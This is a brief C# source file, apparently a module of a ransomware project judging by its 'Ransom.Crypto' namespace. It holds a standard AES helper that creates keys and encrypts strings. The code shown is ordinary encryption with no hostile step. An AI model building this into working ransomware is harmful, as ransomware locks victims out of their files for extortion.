using System.IO;
using System.Security.Cryptography;

namespace Ransom.Crypto
{
    class Symmetric
    {
        public Symmetric() { }

        public static Aes GenerateKey()
        {
            return Aes.Create();
        }

        public static byte[] String2AES(string plainText, byte[] key, byte[] iv)
        {
            byte[] encrypted;
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
                using MemoryStream msEncrypt = new MemoryStream();
                using CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write);
                using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                {
                    swEncrypt.Write(plainText);
                }

                encrypted = msEncrypt.ToArray();
            }

            return encrypted;
        }
    }
}
